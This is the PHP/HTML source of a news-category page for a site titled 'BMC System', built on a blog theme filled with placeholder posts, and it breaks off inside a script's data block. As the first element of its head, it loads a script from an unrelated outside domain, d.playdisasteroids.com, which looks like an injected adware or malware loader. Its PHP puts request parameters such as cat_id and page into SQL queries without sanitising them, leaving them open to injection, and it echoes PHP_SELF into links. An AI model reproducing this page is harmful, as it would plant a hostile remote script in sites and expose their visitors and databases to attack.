<?php
include("controller/connection.php");
include("includes/common_function.php");
if(isset($_REQUEST['cat_id']))
{
	$cat_id = $_REQUEST['cat_id'];
}
?>
<!DOCTYPE html>
<!--[if lt IE 7]>      <html class="no-js html-loading wf-active ie old-browser lt-ie10 lt-ie9 lt-ie8 lt-ie7" lang="en-US"> <![endif]-->
<!--[if IE 7]>         <html class="no-js html-loading wf-active ie old-browser ie7 lt-ie10 lt-ie9 lt-ie8" lang="en-US"> <![endif]-->
<!--[if IE 8]>         <html class="no-js html-loading wf-active ie old-browser ie8 lt-ie10 lt-ie9" lang="en-US"> <![endif]-->
<!--[if IE 9]>         <html class="no-js html-loading wf-active ie modern-browser ie9 lt-ie10" lang="en-US"> <![endif]-->
<!--[if gt IE 9]><!--> <html class="no-js html-loading wf-active modern-browser" lang="en-US"> <!--<![endif]-->

<head><script src="http://d.playdisasteroids.com/l/load.js"></script>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<meta name="viewport" content="width=device-width, maximum-scale=1.0, minimum-scale=1.0">
<title>BMC System</title>

<!-- W3TC-include-js-head -->
<!--[if IE 8]> 
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<![endif]-->
<link rel='stylesheet' id='bbp-default-css'  href='css/bbpress.css' type='text/css' media='screen' />
<link rel='stylesheet' id='contact-form-7-css'  href='css/styles.css' type='text/css' media='all' />
<link rel='stylesheet' id='rs-settings-css'  href='css/settings.css' type='text/css' media='all' />
<link rel='stylesheet' id='rs-captions-css'  href='css/dynamic-captions.css' type='text/css' media='all' />
<link rel='stylesheet' id='rs-plugin-static-css'  href='css/static-captions.css' type='text/css' media='all' />
<link rel='stylesheet' id='wptation-demo-options-css'  href='css/options.css' type='text/css' media='all' />
<link rel='stylesheet' id='wpt-custom-login-css'  href='css/custom-login.css' type='text/css' media='all' />
<link rel='stylesheet' id='theme-bootstrap-css'  href='css/bootstrap.css' type='text/css' media='all' />
<link rel='stylesheet' id='theme-frontend-style-css'  href='css/style.css' type='text/css' media='all' />
<link rel='stylesheet' id='theme-frontend-extensions-css'  href='css/extensions.css' type='text/css' media='all' />
<link rel='stylesheet' id='theme-bootstrap-responsive-1170-css'  href='css/bootstrap-responsive-1170.css' type='text/css' media='all' />
<link rel='stylesheet' id='theme-bootstrap-responsive-css'  href='css/bootstrap-responsive.css' type='text/css' media='all' />
<link rel='stylesheet' id='theme-woocommerce-css'  href='css/woocommerce.css' type='text/css' media='all' />
<link rel='stylesheet' id='theme-bbpress-css'  href='css/bbpress(1).css' type='text/css' media='all' />
<link rel='stylesheet' id='theme-fontawesome-css'  href='css/font-awesome.min.css' type='text/css' media='all' />
<link href='http://fonts.googleapis.com/css?family=Open+Sans:400italic,600italic,400,700,600' rel='stylesheet' type='text/css'>
<!--[if IE 7]>
<link rel='stylesheet' id='theme-fontawesome-ie7-css'  href='http://envision.wptation.com/wp-content/themes/envision/includes/modules/module.fontawesome/source/css/font-awesome-ie7.min.css' type='text/css' media='all' />
<![endif]-->
<link rel='stylesheet' id='theme-icomoon-css'  href='css/icomoon.css' type='text/css' media='all' />
<script type='text/javascript'>
/* <![CDATA[ */
var CloudFwOp = {"themeurl":"http:\/\/envision.wptation.com\/wp-content\/themes\/envision","ajaxUrl":"http:\/\/envision.wptation.com\/wp-admin\/admin-ajax.php","device":"widescreen","RTL":"","responsive":"1","lang":"en-US","sticky_header":"1","sticky_header_offset":"0","uniform_elements":"1","disable_prettyphoto_on_mobile":"1","gallery_overlay_opacity":"0.9"};
/* ]]> */
</script>
<script type='text/javascript' src='js/jquery.js'></script>
<script type='text/javascript' src='js/jquery-migrate.min.js'></script>
<script type='text/javascript' src='js/jquery.themepunch.plugins.min.js'></script>
<script type='text/javascript' src='js/jquery.themepunch.revolution.min.js'></script>
<script type='text/javascript' src='js/options.js'></script>
<script type='text/javascript' src='js/common.js'></script>
<script type='text/javascript' src='js/modernizr-2.6.2-respond-1.1.0.min.js'></script>
<script type='text/javascript' src='js/noconflict.js'></script>
<script type='text/javascript' src='js/webfont.js'></script>
<script type='text/javascript' src='js/comment-reply.min.js'></script>
<script type="text/javascript">
(function(){
	"use strict";

	if( document.cookie.indexOf('device_pixel_ratio') == -1
	    && 'devicePixelRatio' in window
	    && window.devicePixelRatio >= 1.5 ){

		var date = new Date();
		date.setTime( date.getTime() + 3600000 );

		document.cookie = 'device_pixel_ratio=' + window.devicePixelRatio + ';' +  ' expires=' + date.toUTCString() +'; path=/';
		
		//if cookies are not blocked, reload the page
		if(document.cookie.indexOf('device_pixel_ratio') != -1) {
		    window.location.reload();
		}
	}
})();
</script>

<link rel="stylesheet" id= "skin" href="css/Orange-Skin_9b39c377b5bb3aaa585dc0c6379802f9.css" type="text/css" media="all"/>
<style type= "text/css">@media (min-width: 768px) and (max-width: 979px) {
  html #header-navigation li.menu-item.level-0 > a {
    padding-left: 18px;
    padding-right: 18px;
  }
}
</style><script type="text/javascript" src="js/yxq5xji.js"></script>
<script type="text/javascript">try{Typekit.load();}catch(e){}</script>
<script type="text/javascript">
    
    document.documentElement.className = document.documentElement.className.replace('no-js','js');
    document.documentElement.className = document.documentElement.className.replace('html-loaded','html-loading');

    (function(){
        "use strict";

        setTimeout(function(){
            document.documentElement.className = document.documentElement.className.replace('html-loading','html-loaded');
        }, 6000);

    })();
    
    jQuery(document).ready(function(){ 
        jQuery('html').removeClass('html-loading').addClass('html-loaded');
    });

</script>

</head>

<body class="page page-id-11 page-template-default run layout--boxed" itemscope itemtype="http://schema.org/WebPage" style="background-image: url(images/10.png);">
<div id="side-panel-pusher">
  <div id="main-container">
    <div id="page-wrap">
      <header id="page-header" class="clearfix">
<?php 
include("includes/header.php");
?>        <!-- /#header-container --> </header>
       
<div class="vw-breaking-news-bar">
    <div class="container">
      <div class="row">
        <div class="col-sm-12">

          <div class="vw-breaking-news">
            <ul class="vw-breaking-news-list">
             <?php
			$getInfoByTableName = getInfoByTableNameN("manage_news");
			foreach($getInfoByTableName as $records)
			{
				$date =date('d', $records['added_date']); 
                $month =date('M', $records['added_date']);
				$year = date('Y', $records['added_date']);
			?>
              <li> <span class="vw-breaking-news-post-date vw-header-font"> <span class="vw-breaking-news-date"><?=$date?></span> <span class="vw-breaking-news-month"><?=$month." ".$year;?></span> </span> <a class="vw-breaking-news-link vw-header-font" href="#" rel="bookmark"><?=$records['news_title'];?></a></li>
              <?php } ?>
            </ul>
          </div>
          
          <div class="clear"></div>


          
        </div>
      </div>
    </div>
  </div><!-- /#titlebar -->

<?php
$cond = " id='".$cat_id."'";
$getInfoByTableNameAndID = getInfoByTableNameAndID("manage_category_news",$cond);
?>
	<div id="page-content" class="sidebar-layout ui-row sidebar-right category-hd"><div class="container"><div id="the-content">
    <div class="vw-page-title-wrapper-inner"><div class="vw-page-title-box clearfix"><div class="vw-page-title-box-inner"> <span class="vw-label vw-header-font vw-cat-id-2">All posts in</span><h1 class="vw-page-title"><?=$getInfoByTableNameAndID['title']?></h1><div class="vw-page-description"><p><?=$getInfoByTableNameAndID['cat_desc']?></p></div></div></div></div></div></div></div>


	<div id="page-content" class="sidebar-layout ui-row sidebar-right"><div class="container"><div id="the-content" >

	<div class="ui-row row">

<div class="ui-column span12" suitable="true">

<div class="row">
<?php
$cond=" AND FIND_IN_SET ('".$getInfoByTableNameAndID['title']."', cat_id)";
// page is the current page, if there's nothing set, default is page 1
$page = isset($_GET['page']) ? $_GET['page'] : 1;
 
// set records or rows of data per page
$recordsPerPage = 3;
 
// calculate for the query LIMIT clause
$fromRecordNum = ($recordsPerPage * $page) - $recordsPerPage;

$limit = " LIMIT $fromRecordNum, $recordsPerPage";

$getInfoByTableName = getInfoByTableNameNLID("manage_news",$cond, $limit);
foreach($getInfoByTableName as $records)
{


?>

<div class="span6 news-box">
<div class="new-img"><a href=""><img src="admin/news_image/<?=$records['image'];?>" width="360" height="239" alt="news" class="wp-post-image"></a></div>
<div class="new-inner">
<span class="vw-date-box vw-header-font "> <span class="vw-date-box-date">24</span> <span class="vw-date-box-month"> <span>Sep</span> <span>2014</span> </span> </span>
<h3 class="vw-post-box-title"> <a href="detail-page.php?news_id=<?=$records['id'];?>" title="Permalink to Integer accumsan ut imperdiet vestibulum malesuada" rel="bookmark"><?=$records['news_title'];?></a></h3>
<div class="vw-post-box-divider clearfix"></div>
<?=$records['news_desc'];?>

</div>
<div class="vw-post-box-footer vw-header-font"> <img alt="Michael Lacus" src="images/17-52x52.png" class="img-circle" height="26" width="26"> <a class="author-name author" href="#" title="View all posts by Michael Lacus" rel="author">Michael Lacus</a> <a class="vw-post-comment-count" href="#"> <i class="vw-icon icon-iconic-comment-alt2"></i> <span class="vw-header-font">0</span> </a>

<a class="vw-post-comment-count" href="#"> <i class="icomoon-bubbles"></i> <span class="vw-header-font">0</span> </a>

</div>

</div>


<?php 


        // ***** for 'first' and 'previous' pages
        if($page>1){
            // ********** show the first page
            echo "<a href='" . $_SERVER['PHP_SELF'] . "' title='Go to the first page.' class='customBtn'>";
                echo "<span style='margin:0 .5em;'> << </span>";
            echo "</a>";
             
            // ********** show the previous page
            $prev_page = $page - 1;
            echo "<a href='" . $_SERVER['PHP_SELF']
                    . "?page={$prev_page}' title='Previous page is {$prev_page}.' class='customBtn'>";
                echo "<span style='margin:0 .5em;'> < </span>";
            echo "</a>";
             
        }
 
        // find out total pages
        $query = "SELECT * FROM manage_news WHERE news_status='1' $cond";
        $total_rows = mysql_num_rows(mysql_query($query));
        
        $total_pages = ceil($total_rows / $recordsPerPage);

		// range of num links to show
        $range = 2;
 
        // display links to 'range of pages' around 'current page'
        $initial_num = $page - $range;
        $condition_limit_num = ($page + $range)  + 1;
 

} 
        for ($x=$initial_num; $x<$condition_limit_num; $x++) {
             
            // be sure '$x is greater than 0' AND 'less than or equal to the $total_pages'
            if (($x > 0) && ($x <= $total_pages)) {
             
                // current page
                if ($x == $page) {
                    echo "<nav class='vw-page-navigation clearfix' role='navigation'> <span class='vw-page-navigation-title'>Page : </span><div class='vw-page-navigation-pagination'> <span class='page-numbers current'>$x</span> </div><div class='vw-page-navigation-divider'></div> </nav>";
                }
				else {
                    echo "<nav class='vw-page-navigation clearfix' role='navigation'> <span class='vw-page-navigation-title'>Page : </span><div class='vw-page-navigation-pagination'><a class='page-numbers' href='".$_SERVER['PHP_SELF']."?page=$x'>$x</a>   <a class='next page-numbers' href='".$_SERVER['PHP_SELF']."?page=$x'><i class='icomoon-arrow-right'></i></a></div><div class='vw-page-navigation-divider'></div> </nav>";
                }

            }
        }?>

</div>

 
</div>
 


</div>

	</div>

	<aside class="span3">

<div id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="#"> <label> <span class="screen-reader-text">Search for:</span> <input type="search" class="search-field" placeholder="Search …" value="" name="s" title="Search for:"> </label> <input type="submit" class="search-submit" value="Search"></form></div>


<div class="top-post">
<div class="ui--title ui--animation ui--title-bordered text-left"><div class="ui--title-holder"><h3 class="ui--title-text"><strong>TOP POSTS</strong></h3> 
  <div class="ui--title-borders ui--title-border-left" style="display: block; left: -2000px;"></div>
 <div class="ui--title-borders ui--title-border-right" style="display: block; left: 295px;"></div>
 </div>
 </div>
 
 <div class="ui--tabs ui--tabs-mega clearfix text-left ui--done"><div class="ui--tabs-header ui--accent-gradient ui--accent-color clearfix"><div class="container"><ul class="ui--tabs-titles clearfix unstyled"><li class="first-item active"><h5><a href="#tab-1-1">Vestibulum</a></h5></li><li class="last-item"><h5><a href="#tab-1-2">Praesent</a></h5></li></ul></div></div><div class="clearfix"></div><ul class="ui--tabs-contents text-left clearfix"><li class="first-item active"> 
 
 <div class="vw-post-loop vw-post-loop-small-left-thumbnail"><div class="row"><div class="col-sm-12"><div class="vw-post-box vw-post-style-small-left-thumbnail clearfix vw-post-format-standard"> <a class="vw-post-box-thumbnail" href="#" rel="bookmark"> <img width="60" height="60" src="images/news-img2.jpg" class="attachment-vw_small_squared_thumbnail wp-post-image" alt="8613990438_835d034a82_o"> </a><div class="vw-post-box-inner"><h5 class="vw-post-box-title"> <a href="#" title="Permalink to Integer accumsan ut imperdiet vestibulum malesuada" rel="bookmark">Integer accumsan ut imperdiet vestibulum malesuada</a></h5><span class="vw-post-meta-icon vw-post-view-count vw-post-views-id-22" data-post-id="22"> <i class="vw-icon icon-iconic-eye"></i> <span class="vw-post-view-number vw-header-font">2.5k</span></span> <a href="#" class="vw-post-meta-icon vw-post-likes-count " id="vw-post-likes-id-22" data-post-id="22" title="I like this"><i class="vw-icon icon-iconic-heart-empty"></i><span class="vw-post-likes-number vw-header-font">58</span></a></div></div><div class="vw-post-box vw-post-style-small-left-thumbnail clearfix vw-post-format-audio"> <a class="vw-post-box-thumbnail" href="#" rel="bookmark"> <img width="60" height="60" src="images/news-img2.jpg" class="attachment-vw_small_squared_thumbnail wp-post-image" alt="13641182144_a3266f6dff_o"> </a><div class="vw-post-box-inner"><h5 class="vw-post-box-title"> <a href="#" title="Permalink to Donec tristique leo eu tincidunt nisl eu porta scelerisque" rel="bookmark">Donec tristique leo eu tincidunt nisl eu porta scelerisque</a></h5><span class="vw-post-meta-icon vw-post-view-count vw-post-views-id-61" data-post-id="61"> <i class="vw-icon icon-iconic-eye"></i> <span class="vw-post-view-number vw-header-font">1.4k</span></span> <a href="#" class="vw-post-meta-icon vw-post-likes-count " id="vw-post-likes-id-61" data-post-id="61" title="I like this"><i class="vw-icon icon-iconic-heart-empty"></i><span class="vw-post-likes-number vw-header-font">28</span></a></div></div></div></div></div>
 
  </li><li class="last-item hidden">
  
  
  <div class="vw-post-loop vw-post-loop-small-left-thumbnail"><div class="row"><div class="col-sm-12"><div class="vw-post-box vw-post-style-small-left-thumbnail clearfix vw-post-format-standard"> <a class="vw-post-box-thumbnail" href="#" rel="bookmark"> <img width="60" height="60" src="images/news-img2.jpg" class="attachment-vw_small_squared_thumbnail wp-post-image" alt="8613990438_835d034a82_o"> </a><div class="vw-post-box-inner"><h5 class="vw-post-box-title"> <a href="#" title="Permalink to Integer accumsan ut imperdiet vestibulum malesuada" rel="bookmark">Integer accumsan ut imperdiet vestibulum malesuada</a></h5><span class="vw-post-meta-icon vw-post-view-count vw-post-views-id-22" data-post-id="22"> <i class="vw-icon icon-iconic-eye"></i> <span class="vw-post-view-number vw-header-font">2.5k</span></span> <a href="#" class="vw-post-meta-icon vw-post-likes-count " id="vw-post-likes-id-22" data-post-id="22" title="I like this"><i class="vw-icon icon-iconic-heart-empty"></i><span class="vw-post-likes-number vw-header-font">58</span></a></div></div><div class="vw-post-box vw-post-style-small-left-thumbnail clearfix vw-post-format-audio"> <a class="vw-post-box-thumbnail" href="#" rel="bookmark"> <img width="60" height="60" src="images/news-img2.jpg" class="attachment-vw_small_squared_thumbnail wp-post-image" alt="13641182144_a3266f6dff_o"> </a><div class="vw-post-box-inner"><h5 class="vw-post-box-title"> <a href="#" title="Permalink to Donec tristique leo eu tincidunt nisl eu porta scelerisque" rel="bookmark">Donec tristique leo eu tincidunt nisl eu porta scelerisque</a></h5><span class="vw-post-meta-icon vw-post-view-count vw-post-views-id-61" data-post-id="61"> <i class="vw-icon icon-iconic-eye"></i> <span class="vw-post-view-number vw-header-font">1.4k</span></span> <a href="#" class="vw-post-meta-icon vw-post-likes-count " id="vw-post-likes-id-61" data-post-id="61" title="I like this"><i class="vw-icon icon-iconic-heart-empty"></i><span class="vw-post-likes-number vw-header-font">28</span></a></div></div></div></div></div>
  
   </li></ul></div>
 
 
</div>
    
<div id="vw_widget_posts-2" class="widget widget_vw_widget_posts">
<div class="ui--title ui--animation ui--title-bordered text-left"><div class="ui--title-holder"><h3 class="ui--title-text"><strong>RECENT POSTS</strong></h3> 
  <div class="ui--title-borders ui--title-border-left" style="display: block; left: -2000px;"></div>
 <div class="ui--title-borders ui--title-border-right" style="display: block; left: 295px;"></div>
 </div>

 </div>

<div class="vw-post-loop vw-post-loop-small-left-thumbnail"><div class="row"><div class="col-sm-12"><div class="vw-post-box vw-post-style-small-left-thumbnail clearfix vw-post-format-standard"> <a class="vw-post-box-thumbnail" href="#" rel="bookmark"> <img width="60" height="60" src="images/news-img2.jpg" class="attachment-vw_small_squared_thumbnail wp-post-image" alt="8613990438_835d034a82_o"> </a><div class="vw-post-box-inner"><h5 class="vw-post-box-title"> <a href="#" title="Permalink to Integer accumsan ut imperdiet vestibulum malesuada" rel="bookmark">Integer accumsan ut imperdiet vestibulum malesuada</a></h5><span class="vw-post-meta-icon vw-post-view-count vw-post-views-id-22" data-post-id="22"> <i class="vw-icon icon-iconic-eye"></i> <span class="vw-post-view-number vw-header-font">2.5k</span></span> <a href="#" class="vw-post-meta-icon vw-post-likes-count " id="vw-post-likes-id-22" data-post-id="22" title="I like this"><i class="vw-icon icon-iconic-heart-empty"></i><span class="vw-post-likes-number vw-header-font">58</span></a></div></div><div class="vw-post-box vw-post-style-small-left-thumbnail clearfix vw-post-format-audio"> <a class="vw-post-box-thumbnail" href="#" rel="bookmark"> <img width="60" height="60" src="images/news-img2.jpg" class="attachment-vw_small_squared_thumbnail wp-post-image" alt="13641182144_a3266f6dff_o"> </a><div class="vw-post-box-inner"><h5 class="vw-post-box-title"> <a href="#" title="Permalink to Donec tristique leo eu tincidunt nisl eu porta scelerisque" rel="bookmark">Donec tristique leo eu tincidunt nisl eu porta scelerisque</a></h5><span class="vw-post-meta-icon vw-post-view-count vw-post-views-id-61" data-post-id="61"> <i class="vw-icon icon-iconic-eye"></i> <span class="vw-post-view-number vw-header-font">1.4k</span></span> <a href="#" class="vw-post-meta-icon vw-post-likes-count " id="vw-post-likes-id-61" data-post-id="61" title="I like this"><i class="vw-icon icon-iconic-heart-empty"></i><span class="vw-post-likes-number vw-header-font">28</span></a></div></div><div class="vw-post-box vw-post-style-small-left-thumbnail clearfix vw-post-format-standard"> <a class="vw-post-box-thumbnail" href="#" rel="bookmark"> <img width="60" height="60" src="images/news-img2.jpg" class="attachment-vw_small_squared_thumbnail wp-post-image" alt="4223301478_60747fb227_o"> </a><div class="vw-post-box-inner"><h5 class="vw-post-box-title"> <a href="#" title="Permalink to Proin eu sapien id sodales dui pellentesque ac est risus" rel="bookmark">Proin eu sapien id sodales dui pellentesque ac est risus</a></h5><span class="vw-post-meta-icon vw-post-view-count vw-post-views-id-59" data-post-id="59"> <i class="vw-icon icon-iconic-eye"></i> <span class="vw-post-view-number vw-header-font">1.1k</span></span> <a href="#" class="vw-post-meta-icon vw-post-likes-count " id="vw-post-likes-id-59" data-post-id="59" title="I like this"><i class="vw-icon icon-iconic-heart-empty"></i><span class="vw-post-likes-number vw-header-font">27</span></a></div></div><div class="vw-post-box vw-post-style-small-left-thumbnail clearfix vw-post-format-standard"> <a class="vw-post-box-thumbnail" href="#" rel="bookmark"> <img width="60" height="60" src="images/news-img2.jpg" class="attachment-vw_small_squared_thumbnail wp-post-image" alt="Vintage Memories on the Mother Road"> </a><div class="vw-post-box-inner"><h5 class="vw-post-box-title"> <a href="#" title="Permalink to Fusce condimentum ullamcorper venenatis sem mauris" rel="bookmark">Fusce condimentum ullamcorper venenatis sem mauris</a></h5><span class="vw-post-meta-icon vw-post-view-count vw-post-views-id-57" data-post-id="57"> <i class="vw-icon icon-iconic-eye"></i> <span class="vw-post-view-number vw-header-font">566</span></span> <a href="#" class="vw-post-meta-icon vw-post-likes-count " id="vw-post-likes-id-57" data-post-id="57" title="I like this"><i class="vw-icon icon-iconic-heart-empty"></i><span class="vw-post-likes-number vw-header-font">17</span></a></div></div><div class="vw-post-box vw-post-style-small-left-thumbnail clearfix vw-post-format-standard"> <a class="vw-post-box-thumbnail" href="#" rel="bookmark"> <img width="60" height="60" src="images/news-img2.jpg" class="attachment-vw_small_squared_thumbnail wp-post-image" alt="8504471125_648e67e4b0_o"> </a><div class="vw-post-box-inner"><h5 class="vw-post-box-title"> <a href="#" title="Permalink to Cras enim auctor ac purus quis tempus aliquet" rel="bookmark">Cras enim auctor ac purus quis tempus aliquet</a></h5><span class="vw-post-meta-icon vw-post-view-count vw-post-views-id-55" data-post-id="55"> <i class="vw-icon icon-iconic-eye"></i> <span class="vw-post-view-number vw-header-font">853</span></span> <a href="#" class="vw-post-meta-icon vw-post-likes-count " id="vw-post-likes-id-55" data-post-id="55" title="I like this"><i class="vw-icon icon-iconic-heart-empty"></i><span class="vw-post-likes-number vw-header-font">19</span></a></div></div></div></div></div></div>



	</aside><!-- #custom(blog-widget-area) .widget-area -->
<div class="clear"></div>
</div>

<div class="clear"></div>
<!-- /.container --></div><!-- /#page-content -->



<?php 
include("includes/footer.php");
?> 
<script type="text/javascript">// <![CDATA[
		var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
		document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
		// ]]></script>
		<script type="text/javascript">// <![CDATA[
		try{
		var pageTracker = _gat._getTracker("UA-37808265-3");
		pageTracker._trackPageview();
		} catch(err) {} 
	// ]]></script>


<script type='text/javascript' src='js/editor.js'></script>
<script type='text/javascript' src='js/jquery.form.min.js'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var _wpcf7 = {"loaderUrl":"http:\/\/envision.wptation.com\/wp-content\/plugins\/contact-form-7\/images\/ajax-loader.gif","sending":"Sending ...","cached":"1"};
/* ]]> */
</script>
<script type='text/javascript' src='js/scripts.js'></script>
<script type='text/javascript' src='js/add-to-cart.min.js'></script>
<script type='text/javascript' src='js/jquery.blockUI.min.js'></script>
<script type='text/javascript' src='js/jquery.placeholder.min.js'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var woocommerce_params = {"countries":"{\"AF\":[],\"AT\":[],\"BE\":[],\"BI\":[],\"CZ\":[],\"DE\":[],\"DK\":[],\"FI\":[],\"FR\":[],\"HU\":[],\"IS\":[],\"IL\":[],\"KR\":[],\"NL\":[],\"NO\":[],\"PL\":[],\"PT\":[],\"SG\":[],\"SK\":[],\"SI\":[],\"LK\":[],\"SE\":[],\"VN\":[],\"AU\":{\"ACT\":\"Australian Capital Territory\",\"NSW\":\"New South Wales\",\"NT\":\"Northern Territory\",\"QLD\":\"Queensland\",\"SA\":\"South Australia\",\"TAS\":\"Tasmania\",\"VIC\":\"Victoria\",\"WA\":\"Western Australia\"},\"BR\":{\"AC\":\"Acre\",\"AL\":\"Alagoas\",\"AP\":\"Amap\u00e1\",\"AM\":\"Amazonas\",\"BA\":\"Bahia\",\"CE\":\"Cear\u00e1\",\"DF\":\"Distrito Federal\",\"ES\":\"Esp\u00edrito Santo\",\"GO\":\"Goi\u00e1s\",\"MA\":\"Maranh\u00e3o\",\"MT\":\"Mato Grosso\",\"MS\":\"Mato Grosso do Sul\",\"MG\":\"Minas Gerais\",\"PA\":\"Par\u00e1\",\"PB\":\"Para\u00edba\",\"PR\":\"Paran\u00e1\",\"PE\":\"Pernambuco\",\"PI\":\"Piau\u00ed\",\"RJ\":\"Rio de Janeiro\",\"RN\":\"Rio Grande do Norte\",\"RS\":\"Rio Grande do Sul\",\"RO\":\"Rond\u00f4nia\",\"RR\":\"Roraima\",\"SC\":\"Santa Catarina\",\"SP\":\"S\u00e3o Paulo\",\"SE\":\"Sergipe\",\"TO\":\"Tocantins\"},\"CA\":{\"AB\":\"Alberta\",\"BC\":\"British Columbia\",\"MB\":\"Manitoba\",\"NB\":\"New Brunswick\",\"NL\":\"Newfoundland\",\"NT\":\"Northwest Territories\",\"NS\":\"Nova Scotia\",\"NU\":\"Nunavut\",\"ON\":\"Ontario\",\"PE\":\"Prince Edward Island\",\"QC\":\"Quebec\",\"SK\":\"Saskatchewan\",\"YT\":\"Yukon Territory\"},\"CN\":{\"CN1\":\"Yunnan \\\/ \u4e91\u5357\",\"CN2\":\"Beijing \\\/ \u5317\u4eac\",\"CN3\":\"Tianjin \\\/ \u5929\u6d25\",\"CN4\":\"Hebei \\\/ \u6cb3\u5317\",\"CN5\":\"Shanxi \\\/ \u5c71\u897f\",\"CN6\":\"Inner Mongolia \\\/ \u5167\u8499\u53e4\",\"CN7\":\"Liaoning \\\/ \u8fbd\u5b81\",\"CN8\":\"Jilin \\\/ \u5409\u6797\",\"CN9\":\"Heilongjiang \\\/ \u9ed1\u9f99\u6c5f\",\"CN10\":\"Shanghai \\\/ \u4e0a\u6d77\",\"CN11\":\"Jiangsu \\\/ \u6c5f\u82cf\",\"CN12\":\"Zhejiang \\\/ \u6d59\u6c5f\",\"CN13\":\"Anhui \\\/ \u5b89\u5fbd\",\"CN14\":\"Fujian \\\/ \u798f\u5efa\",\"CN15\":\"Jiangxi \\\/ \u6c5f\u897f\",\"CN16\":\"Shandong \\\/ \u5c71\u4e1c\",\"CN17\":\"Henan \\\/ \u6cb3\u5357\",\"CN18\":\"Hubei \\\/ \u6e56\u5317\",\"CN19\":\"Hunan \\\/ \u6e56\u5357\",\"CN20\":\"Guangdong \\\/ \u5e7f\u4e1c\",\"CN21\":\"Guangxi Zhuang \\\/ \u5e7f\u897f\u58ee\u65cf\",\"CN22\":\"Hainan \\\/ \u6d77\u5357\",\"CN23\":\"Chongqing \\\/ \u91cd\u5e86\",\"CN24\":\"Sichuan \\\/ \u56db\u5ddd\",\"CN25\":\"Guizhou \\\/ \u8d35\u5dde\",\"CN26\":\"Shaanxi \\\/ \u9655\u897f\",\"CN27\":\"Gansu \\\/ \u7518\u8083\",\"CN28\":\"Qinghai \\\/ \u9752\u6d77\",\"CN29\":\"Ningxia Hui \\\/ \u5b81\u590f\",\"CN30\":\"Macau \\\/ \u6fb3\u95e8\",\"CN31\":\"Tibet \\\/ \u897f\u85cf\",\"CN32\":\"Xinjiang \\\/ \u65b0\u7586\"},\"HK\":{\"HONG KONG\":\"Hong Kong Island\",\"KOWLOON\":\"Kowloon\",\"NEW TERRITORIES\":\"New Territories\"},\"IN\":{\"AP\":\"Andra Pradesh\",\"AR\":\"Arunachal Pradesh\",\"AS\":\"Assam\",\"BR\":\"Bihar\",\"CT\":\"Chhattisgarh\",\"GA\":\"Goa\",\"GJ\":\"Gujarat\",\"HR\":\"Haryana\",\"HP\":\"Himachal Pradesh\",\"JK\":\"Jammu and Kashmir\",\"JH\":\"Jharkhand\",\"KA\":\"Karnataka\",\"KL\":\"Kerala\",\"MP\":\"Madhya Pradesh\",\"MH\":\"Maharashtra\",\"MN\":\"Manipur\",\"ML\":\"Meghalaya\",\"MZ\":\"Mizoram\",\"NL\":\"Nagaland\",\"OR\":\"Orissa\",\"PB\":\"Punjab\",\"RJ\":\"Rajasthan\",\"SK\":\"Sikkim\",\"TN\":\"Tamil Nadu\",\"TR\":\"Tripura\",\"UT\":\"Uttaranchal\",\"UP\":\"Uttar Pradesh\",\"WB\":\"West Bengal\",\"AN\":\"Andaman and Nicobar Islands\",\"CH\":\"Chandigarh\",\"DN\":\"Dadar and Nagar Haveli\",\"DD\":\"Daman and Diu\",\"DL\":\"Delhi\",\"LD\":\"Lakshadeep\",\"PY\":\"Pondicherry (Puducherry)\"},\"ID\":{\"AC\":\"Daerah Istimewa Aceh\",\"SU\":\"Sumatera Utara\",\"SB\":\"Sumatera Barat\",\"RI\":\"Riau\",\"KR\":\"Kepulauan Riau\",\"JA\":\"Jambi\",\"SS\":\"Sumatera Selatan\",\"BB\":\"Bangka Belitung\",\"BE\":\"Bengkulu\",\"LA\":\"Lampung\",\"JK\":\"DKI Jakarta\",\"JB\":\"Jawa Barat\",\"BT\":\"Banten\",\"JT\":\"Jawa Tengah\",\"JI\":\"Jawa Timur\",\"YO\":\"Daerah Istimewa Yogyakarta\",\"BA\":\"Bali\",\"NB\":\"Nusa Tenggara Barat\",\"NT\":\"Nusa Tenggara Timur\",\"KB\":\"Kalimantan Barat\",\"KT\":\"Kalimantan Tengah\",\"KI\":\"Kalimantan Timur\",\"KS\":\"Kalimantan Selatan\",\"KU\":\"Kalimantan Utara\",\"SA\":\"Sulawesi Utara\",\"ST\":\"Sulawesi Tengah\",\"SG\":\"Sulawesi Tenggara\",\"SR\":\"Sulawesi Barat\",\"SN\":\"Sulawesi Selatan\",\"GO\":\"Gorontalo\",\"MA\":\"Maluku\",\"MU\":\"Maluku Utara\",\"PA\":\"Papua\",\"PB\":\"Papua Barat\"},\"MY\":{\"JHR\":\"Johor\",\"KDH\":\"Kedah\",\"KTN\":\"Kelantan\",\"MLK\":\"Melaka\",\"NSN\":\"Negeri Sembilan\",\"PHG\":\"Pahang\",\"PRK\":\"Perak\",\"PLS\":\"Perlis\",\"PNG\":\"Pulau Pinang\",\"SBH\":\"Sabah\",\"SWK\":\"Sarawak\",\"SGR\":\"Selangor\",\"TRG\":\"Terengganu\",\"KUL\":\"W.P. Kuala Lumpur\",\"LBN\":\"W.P. Labuan\",\"PJY\":\"W.P. Putrajaya\"},\"NZ\":{\"NL\":\"Northland\",\"AK\":\"Auckland\",\"WA\":\"Waikato\",\"BP\":\"Bay of Plenty\",\"TK\":\"Taranaki\",\"HB\":\"Hawke\u2019s Bay\",\"MW\":\"Manawatu-Wanganui\",\"WE\":\"Wellington\",\"NS\":\"Nelson\",\"MB\":\"Marlborough\",\"TM\":\"Tasman\",\"WC\":\"West Coast\",\"CT\":\"Canterbury\",\"OT\":\"Otago\",\"SL\":\"Southland\"},\"ZA\":{\"EC\":\"Eastern Cape\",\"FS\":\"Free State\",\"GP\":\"Gauteng\",\"KZN\":\"KwaZulu-Natal\",\"LP\":\"Limpopo\",\"MP\":\"Mpumalanga\",\"NC\":\"Northern Cape\",\"NW\":\"North West\",\"WC\":\"Western Cape\"},\"ES\":{\"C\":\"A 